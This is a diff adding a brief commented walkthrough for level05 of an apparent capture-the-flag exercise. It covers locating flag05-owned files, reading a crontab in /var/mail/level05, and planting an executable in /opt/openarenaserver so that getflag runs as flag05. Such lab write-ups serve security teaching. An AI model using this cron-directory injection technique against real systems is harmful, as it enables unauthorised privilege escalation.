@@ -1,0 +1,11 @@
+#Enter the following command : find / -user flag05 2>/dev/null
+#Cat the first file : /usr/sbin/openarenaserver
+#and u will get a script with path /opt/openarenaserver
+#Enter also the following command : find / -name level05 2>/dev/null 
+#u will get two paths then cat the first one : /var/mail/level05
+#u will get a crontab that means each 2 minutes /usr/sbin/openarenaserver
+#will be executed in user flag05
+#we will use that by creating an executable inside /opt/openarenaserver
+#with echo $(getflag) > /tmp/flag05 and if we cat /tmp/flag05 we will get
+#the output of echo $(getflag) that has been executed in getflag05 user via
+#crontab
